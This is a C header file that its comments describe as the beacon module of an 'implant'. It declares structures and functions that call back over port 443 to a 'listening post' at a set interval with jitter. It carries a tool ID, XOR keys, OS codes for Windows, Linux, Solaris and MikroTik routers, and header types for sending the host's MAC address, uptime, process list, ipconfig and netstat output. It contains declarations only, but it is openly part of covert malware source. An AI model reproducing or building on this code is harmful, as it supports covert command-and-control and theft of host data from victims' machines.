#ifndef __BEACON_H
#define __BEACON_H

#include "function_strings.h"
#include "compat.h"			//NEW

#define MAC_ADDR_LEN 6
#define MAC_ADDR_LEN_FORMATTED 18
#define MAX_SSL_PACKET_SIZE 4052
//#define TOOL_ID 0x68CAFE4A
#define TOOL_ID 0x65ae82c7
#define TOOL_ID_XOR_KEY 3
#define XOR_KEY 5
#define DEFAULT_BEACON_PORT 443		// HTTPS

//Flag defines
// OS
#define	WINDOWS			10
#define LINUX_X86		20
#define SOLARIS_SPARC	30
#define SOLARIS_X86		31
#define MIKROTIK_MIPSBE	40
#define MIKROTIK_MIPSLE	41
#define MIKROTIK_X86	42
#define MIKROTIK_PPC	43

//Header types
#define MAC				1
#define UPTIME			2
#define PROCESS_LIST	3
#define IPCONFIG		4
#define NETSTAT_RN		5
#define NETSTAT_AN		6
#define NEXT_BEACON_TIME 7

/*!
 * @struct BEACONINFO
 * @brief 
 * The BEACONINFO struct holds configuration information about an implant's
 * beacon
 *
 * @var ip - Contains the ip address to beacon back to
 * @var port - Contains the port number to beacon back on
 * @var macAddr - Contains the host's primary MAC address
 * @var initDelay - Time to wait before initial beacon
 * @var interval - Time to wait in between beacons
 */

typedef struct _BEACON_INFO
{
	char *ip;
	int port;
	unsigned char macAddr[MAC_ADDR_LEN];
	int initDelay;
	int interval;
	float percentVariance;
} BEACONINFO;


typedef struct beacon_field
{
	unsigned char mac[20];
	unsigned long uptime;
	unsigned long tool_id;
} BEACONFIELD;


typedef struct beacon_header
{
	unsigned short version;
	unsigned short os;
} BEACON_HDR;

typedef struct add_header
{
	unsigned short type;
	unsigned short length;
}ADD_HDR;

typedef struct ssl_hdr
{
	unsigned char type;
	unsigned short version;
	unsigned short length;
}SSL_HDR;

/*!
 * @brief Beacon
 * 
 * Function to send the MAC address and system uptime of the host
 * computer back to the listening post
 *
 * @param param - void pointer to a BEACONINFO structure
 */
void *beacon(void *param);

/*!
 * @brief BeaconStart
 * 
 * Takes the IP and port to beacon back to and the delay and interval
 * values for the beacon to callback on and populates a BEACONINFO 
 * structure.  Then spawns a seperate thread to perform the beaconing
 * function
 *
 * @param beaconIP - Charater string that holds the IP address to beacon 
 *					 back to
 * @param beaconPort - Port to connect back on
 * @param initialDelay - Intial time to wait before first beacon is sent
 * @param interval - The time to wait in between beacons.
 *
 * @return int - Returns -1 if the beacon thread failed to start or 0 if
 *				 the function succeeded.
 */

int beacon_start( char *beaconIP, int beaconPort, unsigned long initialDelay, int interval, float jitter );
int calc_jitter(int baseTime, float jitterPercent);
#endif //__BEACON_H
